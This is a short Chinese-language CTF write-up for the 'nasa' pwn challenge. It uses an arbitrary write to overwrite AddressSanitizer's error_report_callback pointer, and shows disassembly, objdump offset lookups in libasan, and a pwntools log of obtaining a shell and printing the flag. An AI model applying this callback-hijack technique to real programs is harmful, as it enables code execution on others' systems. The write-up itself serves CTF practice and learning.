# 思路
复写__asan_set_error_report_callback的_ZN6__asanL21error_report_callbackE
```
pwndbg> disassemble  0x7fe358bcec30
Dump of assembler code for function __asan_set_error_report_callback(void (*)(char const*)):
   0x00007fe358bcec30 <+0>:     endbr64
   0x00007fe358bcec34 <+4>:     push   rbp
   0x00007fe358bcec35 <+5>:     xor    esi,esi
   0x00007fe358bcec37 <+7>:     mov    rcx,0xffffffffffffffff
   0x00007fe358bcec3e <+14>:    mov    rbp,rsp
   0x00007fe358bcec41 <+17>:    push   r13
   0x00007fe358bcec43 <+19>:    push   r12
   0x00007fe358bcec45 <+21>:    movabs r12,0x10000000000fffff
   0x00007fe358bcec4f <+31>:    push   rbx
   0x00007fe358bcec50 <+32>:    mov    rbx,rdi
   0x00007fe358bcec53 <+35>:    sub    rsp,0x8
   0x00007fe358bcec57 <+39>:    mov    rax,QWORD PTR [rip+0xaa9b2]        # 0x7fe358c79610 <_ZN6__asanL23error_message_buf_mutexE>
   0x00007fe358bcec5e <+46>:    test   rax,r12
   0x00007fe358bcec61 <+49>:    jne    0x7fe358bced50 <__asan_set_error_report_callback(void (*)(char const*))+288>
   0x00007fe358bcec67 <+55>:    movabs rdx,0x1000000000000000
   0x00007fe358bcec71 <+65>:    or     rdx,rax
   0x00007fe358bcec74 <+68>:    and    rdx,rcx
   0x00007fe358bcec77 <+71>:    lock cmpxchg QWORD PTR [rip+0xaa990],rdx        # 0x7fe358c79610 <_ZN6__asanL23error_message_buf_mutexE>
   0x00007fe358bcec80 <+80>:    jne    0x7fe358bcedf0 <__asan_set_error_report_callback(void (*)(char const*))+448>
   0x00007fe358bcec86 <+86>:    mov    QWORD PTR [rip+0xaa9a3],rbx        # 0x7fe358c79630 <_ZN6__asanL21error_report_callbackE>
   0x00007fe358bcec8d <+93>:    mov    rax,QWORD PTR [rip+0xaa97c]        # 0x7fe358c79610 <_ZN6__asanL23error_message_buf_mutexE>

```

# so库找偏移量
(pip_venv) ➜  nasa objdump -T libasan.so.8 |grep __asan_init
000000000010aef0 g    DF .text  000000000000005d  Base        __asan_init



(pip_venv) ➜  nasa objdump -d libasan.so.8 > libasan.asm
(pip_venv) ➜  nasa

```
(pip_venv) ➜  nasa objdump -T libasan.so.8 |grep __asan_init
000000000010aef0 g    DF .text  000000000000005d  Base        __asan_init
(pip_venv) ➜  nasa objdump -d libasan.so.8 > libasan.asm
(pip_venv) ➜  nasa grep -A 20 "__asan_set_error_report_callback" libasan.asm
0000000000039790 <__asan_set_error_report_callback@plt>:
   39790:       f3 0f 1e fa             endbr64
   39794:       ff 25 0e fe 15 00       jmp    *0x15fe0e(%rip)        # 1995a8 <__asan_set_error_report_callback@@Base+0x95978>
   3979a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000000397a0 <__interceptor_xdr_hyper@plt>:
```
```
(pip_venv) ➜  nasa grep -A 20 "__asan_set_error_report_callback>" libasan.asm
0000000000103c30 <__asan_set_error_report_callback>:
  103c30:       f3 0f 1e fa             endbr64
  103c34:       55                      push   %rbp
  103c35:       31 f6                   xor    %esi,%esi
  103c37:       48 c7 c1 ff ff ff ff    mov    $0xffffffffffffffff,%rcx
  103c3e:       48 89 e5                mov    %rsp,%rbp
  103c41:       41 55                   push   %r13
  103c43:       41 54                   push   %r12
  103c45:       49 bc ff ff 0f 00 00    movabs $0x10000000000fffff,%r12
```

![](https://r2.20161023.xyz/pic/20250621203522796.png)

![](https://r2.20161023.xyz/pic/20250621211147160.png)


# getshell
```
[DEBUG] Received 0x34 bytes:
    b'8-byte adress and 8-byte data to write please (hex)\n'
8-byte adress and 8-byte data to write please (hex)
[DEBUG] Received 0x60 bytes:
    b'AddressSanitizer:DEADLYSIGNAL\n'
    b'=================================================================\n'
AddressSanitizer:DEADLYSIGNAL
=================================================================
[DEBUG] Received 0xe3 bytes:
    b'==15==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x55c98735f57a bp 0x7f18b7f00000 sp 0x7ffe518d10f0 T0)\n'
    b'==15==The signal is caused by a WRITE memory access.\n'
    b'==15==Hint: address points to the zero page.\n'
==15==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x55c98735f57a bp 0x7f18b7f00000 sp 0x7ffe518d10f0 T0)
==15==The signal is caused by a WRITE memory access.
==15==Hint: address points to the zero page.
[DEBUG] Received 0x1f2 bytes:
    b'    #0 0x55c98735f57a in main //nasa.c:32\n'
    b'    #1 0x7f18b9de21c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 42c84c92e6f98126b3e2230ebfdead22c235b667)\n'
    b'    #2 0x7f18b9de228a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 42c84c92e6f98126b3e2230ebfdead22c235b667)\n'
    b'    #3 0x55c98735f244 in _start (/nasa+0x1244) (BuildId: 8a90ab829b3be3adc11853e8207767930b1d1f5d)\n'
    b'\n'
    b'AddressSanitizer can not provide additional info.\n'
    b'SUMMARY: AddressSanitizer: SEGV //nasa.c:32 in main\n'
    #0 0x55c98735f57a in main //nasa.c:32
    #1 0x7f18b9de21c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 42c84c92e6f98126b3e2230ebfdead22c235b667)
    #2 0x7f18b9de228a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 42c84c92e6f98126b3e2230ebfdead22c235b667)
    #3 0x55c98735f244 in _start (/nasa+0x1244) (BuildId: 8a90ab829b3be3adc11853e8207767930b1d1f5d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV //nasa.c:32 in main
[DEBUG] Received 0xc bytes:
    b'YOU WIN!!!\n'
    b'\n'
YOU WIN!!!

$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x42 bytes:
    b'GPNCTF{al1_wR1Te5_aR3_prOTEcteD_bY_aSaN_onLy_in_Y0ur_DreaMS_9438}\n'
GPNCTF{al1_wR1Te5_aR3_prOTEcteD_bY_aSaN_onLy_in_Y0ur_DreaMS_9438}

```
![](https://r2.20161023.xyz/pic/20250621210717303.png)